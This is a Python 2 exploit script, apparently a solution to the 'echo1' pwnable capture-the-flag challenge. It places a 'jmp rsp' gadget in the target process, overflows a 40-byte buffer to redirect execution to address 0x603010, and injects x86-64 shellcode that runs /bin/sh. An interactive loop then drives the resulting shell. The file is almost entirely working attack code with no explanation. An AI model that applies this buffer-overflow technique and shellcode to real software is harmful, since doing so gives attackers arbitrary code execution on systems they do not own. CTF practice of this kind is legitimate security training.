import subprocess
import time
import sys
import struct
import fcntl
import os 

def read_until(word):
        output= ''
        while word not in output:
            output = p.stdout.readline()
            sys.stdout.write(output)



p = subprocess.Popen(["/home/raw/Documents/pwnable/rookis/echo1/echo1"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

jmp_asm = "\xff\xe4"
shellcode = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"


p.stdin.write(jmp_asm + "\n")

read_until("exit")

p.stdin.write("1\n")

read_until("hello")
p.stdin.write("A"*40 + struct.pack("<Q", 0x0000000000603010) + shellcode + "\n")

read_until("goodbye")
#print p.stdout.read()

fd = p.stdout.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

p.stdout.flush()
p.stdin.flush()

while(True):
    try:
        time.sleep(0.1)
        sys.stdout.write(p.stdout.read())
    except:
        p.stdin.write(raw_input() + '\n')

